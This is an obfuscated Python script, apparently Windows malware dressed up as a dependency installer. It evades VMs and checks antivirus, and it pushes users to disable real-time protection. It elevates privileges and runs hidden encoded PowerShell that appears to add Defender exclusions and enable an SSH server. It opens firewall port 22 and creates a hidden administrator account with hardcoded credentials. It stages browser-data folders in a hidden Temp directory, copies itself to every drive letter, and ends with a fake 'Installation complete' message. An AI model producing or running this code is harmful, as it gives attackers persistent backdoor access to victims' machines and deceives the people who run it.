#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pathlib import Path as ecbxpowuzjai
from os import remove as dqycnznxoaipeu
from os import path as ezxqitucnfgsayw
from sys import executable as raqtiocmpvxbawez
from sys import argv as qizacxmbiplrtuy
from ctypes import windll as excbnmzqurioalh
from os import getenv as tvsnqyjwpfmsbvpo
from os import name as yiomqouanehhxp
from os import mkdir as wtxyzndusjsifjs
from os import chdir as xasznghewiqopnm
from sys import exit as ghwtqcnxjaporymcs
from subprocess import run as ditqmnvqahifp
from shutil import copy as ibzopxcmaqnfhlkv
from shutil import move as kxcleuanchrfiw
from re import search as orpcxazmnakshkf
from time import sleep as oquetcbaidgzpx
from winreg import CreateKey
from winreg import HKEY_LOCAL_MACHINE
from winreg import SetValueEx
from winreg import REG_DWORD

#                                                                        EEEEEEEEEEE      X     X     EEEEEEEEEEE
# ||0@#@         .O0O0.       .O0O0.         X         A                 D                 X   X      D 
# ||    X       0      O     0      O       X  X      Z Q                D                  X X       D
# ||     @      O      0     O      0      X    F    F   A               DXXXXXXXXX          X        DFFFFFFFFFF
# ||      @     0      O     0      O     F      B  X     K              D                  X X       D
# ||      @     O      0     0      0    X       X X       K      @@     D                 X   X      D
# ||     O       .O0O0.       .0O0O.    M         X         Z     @@     DVVVVVVVVVV      X     X     DXXXXXXXXXX
# ||#@@@"

if yiomqouanehhxp != "nt":  # _Checks_If_Operating_System_Is_Windows_And_Exits_If_Not
    ghwtqcnxjaporymcs(1)

RAITQZXMVNLOGPWEF = ditqmnvqahifp("PoWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'ZwBFAHQALQBtAFAAYwBPAG0AUAB1AFQAZQByAFMAdABhAHQAVQBzAA=='", shell=True, capture_output=True).stdout.decode()

if orpcxazmnakshkf("IsVirtualMachine                 : True",
                   RAITQZXMVNLOGPWEF):  # _Does_A_Check_4_Vm_Doesnt_Include_vbox_or_VmTools_I_Dont_Think
    excbnmzqurioalh.user32.MessageBoxW(0, "This program is not compatible with your computer.", "Error", 0x10)
    ghwtqcnxjaporymcs(1)
else:
    print("Nice")

if orpcxazmnakshkf("RealTimeProtectionEnabled        : True", RAITQZXMVNLOGPWEF):
    excbnmzqurioalh.user32.MessageBoxW(0, "Real time protection must be disabled to install dependencies.", "Error",
                                       0x10)
    ghwtqcnxjaporymcs(1)
else:  # _Checks_If_Windows_Anti-Virus_Real_Time_Protection_Is_Enabled_And_Works_Some_Social_engineering_magic
    print("SUCCESS")


def a7qye1ngy6p8rnf9beih2nye():  # _Checks_If_Script_Has_Admin_Privs_And_Exits_If_Not_Administrator
    if not excbnmzqurioalh.shell32.IsUserAnAdmin():
        excbnmzqurioalh.shell32.ShellExecuteW(
            None, 'runas', raqtiocmpvxbawez, ' '.join(qizacxmbiplrtuy), None, None)
        ghwtqcnxjaporymcs(1)
    else:
        print("Success")


a7qye1ngy6p8rnf9beih2nye()

FHKJQPXLUPAVMSCWI = tvsnqyjwpfmsbvpo("username")  # _Gets_The_Users_Login_Name_Do_Not_Change
TXJCQLOSIVNMAZYGB = ecbxpowuzjai.home().drive  # _Gets_The_Current_Drive_Path_Do_Not_Change
QTVCSIULPBOAGHDIZ = ezxqitucnfgsayw.basename(qizacxmbiplrtuy[0])  # Gets_The_Current_Filename_Do_Not_Change
SZXJKLORTBVCMNDFQ = "DOOOOM"  # _Name_Of_The_New_Port_Rules
YTZQMWERNTUXIGHAB = "22"  # _Port_Numbers_Must_Be_Seperated_By_Commas
POQWDEFGTRHYJUOLX = "defaultuser"  # _Change_These_SSH_Login_Variables_To_Your_Desired_Credentials_Avoid_Using_A_Username_That_May_Already_Be_On_The_System.
HMJKVLQAEDRTFGOZB = "PassW0rd1@"


def gei7qaz4m5xplfm4uen1ga3zi9rh():
    ditqmnvqahifp(
        "PoWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'YQBEAGQALQBtAFAAcABSAGUARgBlAFIAZQBOAGMARQAgAC0AZQBYAGMATAB1AFMAaQBPAE4AcABBAHQASAAgACQAZQBuAHYAOgBIAD8APwA/AEQAPwA/AD8APwA='",
        shell=True)
    oquetcbaidgzpx(0.1)
    ditqmnvqahifp(
        "PoWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'YQBEAGQALQBtAFAAcABSAGUARgBlAFIAZQBOAGMARQAgAC0AZQBYAGMATAB1AFMAaQBPAE4AcABBAHQASAAgACQAZQBuAHYAOgBTAD8APwA/AGUAPwA/AHIAPwB2AGUA'",
        shell=True)
    oquetcbaidgzpx(0.1)
    ditqmnvqahifp(
        "PoWeRsHeLl NEw-nEtfiReWaLlrUlE -diSpLaYnAmE " + SZXJKLORTBVCMNDFQ + " -dIrEcTiOn InBoUnD -pRoFiLe aNy -aCtIoN aLLoW -LoCaLpOrT " + YTZQMWERNTUXIGHAB + " -pRoToCoL tCp",
        shell=True)
    oquetcbaidgzpx(0.1)
    ditqmnvqahifp(
        "PoWeRsHeLl NEw-nEtfiReWaLlrUlE -diSpLaYnAmE " + SZXJKLORTBVCMNDFQ + " -dIrEcTiOn oUtBoUnD -pRoFiLe aNy -aCtIoN aLLoW -LoCaLpOrT " + YTZQMWERNTUXIGHAB + " -pRoToCoL tCp",
        shell=True)
    oquetcbaidgzpx(0.1)
    ditqmnvqahifp(
        "PoWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'YQBEAGQALQB3AEkAbgBEAG8AdwBTAGMAYQBQAGEAYgBpAGwAaQBUAHkAIAAtAE8AbgBMAGkATgBlACAALQBuAEEAbQBFACAAbwBwAEUAbgBTAHMASAAuAHMAZQByAHYAZQByAH4AfgB+AH4AMAAuADAALgAxAC4AMAA='",
        shell=True)
    oquetcbaidgzpx(0.1)
    ditqmnvqahifp(
        "pPoWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'cwBFAHQALQBzAEUAcgBWAGkAQwBlACAALQBuAEEAbQBFACAAUwBzAEgAZAAgAC0AcwBUAGEAcgBUAHUAUAB0AFkAcABFACAAJwBhAFUAdABPAG0AQQB0AEkAYwAnAA=='",
        shell=True)
    oquetcbaidgzpx(0.1)
    ditqmnvqahifp(
        "PoWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'cwBUAGEAUgB0AC0AcwBFAHIAVgBpAEMAZQAgAHMAUwBoAEQA'",
        shell=True)
    oquetcbaidgzpx(0.1)


gei7qaz4m5xplfm4uen1ga3zi9rh()


def sg1bm2p0vmq5eim3gw8u9m():
    if ezxqitucnfgsayw.exists(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923") >= True:
        print("Nice_Already_Got_Me_A_Seat")
    else:
        try:
            wtxyzndusjsifjs(
                "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
        except:
            print("Error")
    try:
        wtxyzndusjsifjs(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\p0wersh3ll_scr1pts")
    except:
        print("ERROR")
    oquetcbaidgzpx(0.1)
    excbnmzqurioalh.kernel32.SetFileAttributesW(
        "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923", 2)
    oquetcbaidgzpx(0.1)
    if ezxqitucnfgsayw.exists(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + QTVCSIULPBOAGHDIZ + ""):
        dqycnznxoaipeu(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + QTVCSIULPBOAGHDIZ + "")
        oquetcbaidgzpx(0.1)
        kxcleuanchrfiw(QTVCSIULPBOAGHDIZ,
                       "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + QTVCSIULPBOAGHDIZ + "")
        oquetcbaidgzpx(0.1)
        xasznghewiqopnm(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
    else:
        kxcleuanchrfiw(QTVCSIULPBOAGHDIZ,
                       "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + QTVCSIULPBOAGHDIZ + "")
        oquetcbaidgzpx(0.1)
        xasznghewiqopnm(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
    oquetcbaidgzpx(0.1)


sg1bm2p0vmq5eim3gw8u9m()


def e3x1b5m7t9oxq6fa4d():
    GOTPAQWECVBNGMDHSE = CreateKey(HKEY_LOCAL_MACHINE,
                                   "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList")
    oquetcbaidgzpx(0.1)
    SetValueEx(GOTPAQWECVBNGMDHSE, "" + POQWDEFGTRHYJUOLX + "", 0, REG_DWORD, 0)
    GOTPAQWECVBNGMDHSE.Close()


e3x1b5m7t9oxq6fa4d()


def aqro9pf4hgk5ls8jx3i():  # _Adds_A_New_Administrator_To_The_System
    IQRFCSBMAZOJLK = """
    $nusnm = """ + '"{}"'.format(POQWDEFGTRHYJUOLX) + """
    $nuspss = ConvertTo-SecureString """ + '"{}"'.format(HMJKVLQAEDRTFGOZB) + """ -AsPlainText -Force
    New-LocalUser -Name $nusnm -Password $nuspss
    Add-LocalGroupMember -Group "Administrators" -Member $nusnm
    Get-LocalUser
    """
    exec = ditqmnvqahifp(["PoWeRsHeLl", "& {" + IQRFCSBMAZOJLK + "}"])
    oquetcbaidgzpx(0.1)


aqro9pf4hgk5ls8jx3i()


def m1bvz9x3t15ce7wpq():  # _Organising_Temp/Headquarters_Folder
    try:
        wtxyzndusjsifjs(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\ChR0m3_data")
    except:
        print("Error")
    oquetcbaidgzpx(0.1)
    try:
        wtxyzndusjsifjs(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\3dg3_data")
    except:
        print("Error")
    oquetcbaidgzpx(0.1)
    try:
        wtxyzndusjsifjs(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\br4v3_data")
    except:
        print("Error")
    oquetcbaidgzpx(0.1)
    try:
        wtxyzndusjsifjs(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\0p3r4_data")
    except:
        print("Error")
    oquetcbaidgzpx(0.1)
    try:
        wtxyzndusjsifjs(
            "" + TXJCQLOSIVNMAZYGB + "\\Users\\" + FHKJQPXLUPAVMSCWI + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\0p3r4gX_data")
    except:
        print("Error")
    oquetcbaidgzpx(0.1)


m1bvz9x3t15ce7wpq()


def v1zam3g9hlk8jeb5zx():  # _Copys_File_To_All_Connected_Drives's
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "A://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_A_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "B://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_B_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "C://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_C_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "D://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_D_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "E://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_E_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "F://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_F_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "G://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_G_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "H://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_H_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "I://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_I_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "J://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_J_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "K://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_K_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "L://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_L_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "M://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_M_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "N://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_N_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "O://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_O_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "P://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_P_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "Q://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_Q_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "R://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_R_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "S://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_S_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "T://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_T_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "U://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_U_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "V://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_V_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "W://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_W_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "X://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_X_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "Y://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_Y_DRIVE')
    oquetcbaidgzpx(0.1)
    try:
        ibzopxcmaqnfhlkv("" + QTVCSIULPBOAGHDIZ + "", "Z://" + QTVCSIULPBOAGHDIZ + "")
    except:
        print('NO_Z_DRIVE')
    oquetcbaidgzpx(0.1)


v1zam3g9hlk8jeb5zx()

excbnmzqurioalh.user32.MessageBoxW(0, "Installation complete", "Success", 0x40)

ghwtqcnxjaporymcs(0)
